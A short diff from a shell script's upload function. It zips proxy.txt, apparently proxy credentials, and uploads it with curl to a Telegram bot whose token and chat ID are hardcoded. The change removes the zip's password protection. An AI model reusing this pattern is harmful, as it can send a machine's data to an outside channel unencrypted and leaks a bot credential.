@@ -74,8 +74,7 @@ upload_2file() {
    local BOT_TOKEN="6762068554:AAFkTLT-aPOw4qvvuCHx1dZ4TG0FINxyF30"
     local CHAT_ID="-4094164282"
 
-    local PASS=$(random)
-    zip --password $PASS proxy.zip proxy.txt
+    zip proxy.zip proxy.txt
 
     # Upload the zip file to Telegram using curl
     curl -F "chat_id=${CHAT_ID}" -F "document=@proxy.zip" "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument"
